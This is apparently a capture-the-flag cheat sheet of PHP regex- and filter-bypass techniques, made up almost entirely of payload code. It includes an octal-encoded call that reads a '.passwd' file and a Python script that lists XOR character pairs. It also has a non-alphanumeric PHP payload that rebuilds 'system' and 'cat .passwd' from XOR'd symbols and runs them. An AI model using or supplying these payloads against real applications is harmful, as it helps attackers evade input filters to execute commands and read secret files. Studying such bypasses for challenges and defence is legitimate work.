### PHP  vuln

## PHP regex bypass

- With octal encoder https://cryptii.com/pipes/text-octal

		file_get_contents(".passwd") -> "\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163"("\056\160\141\163\163\167\144")

- xor operation

		import string
 
		if __name__ == "__main__":
    		s = string.printable[62:62+32] ##    !"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~
    		s1 = string.printable[:62]     ##    0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
    		for i in s:
        		for j in s:
            		x = chr(ord(i)^ord(j))
            		if x in s1+'_':
                		print '{0}\t{1}\t{2}'.format(i,j,x)

	$_ = "@" ^ "!" //a
                            	
- Convert to phpnonalpha

	Open https://hackvertor.co.uk/public# and use phpnonalpha encoder

- Unicode encoder

		$_=("#"^"@").('('^'@').('2'^'@');  // 'c' + 'h' + 'r'
 		$__=$_(115).$_(121).$_(115).$_(116).$_(101).$_(109); // here system
		$___=$_(99).$_(97).$_(116)." .".$_(112).$_(97).$_(115).$_(115).$_(119).$_(100); //here cat .passwd
 		$__($___);
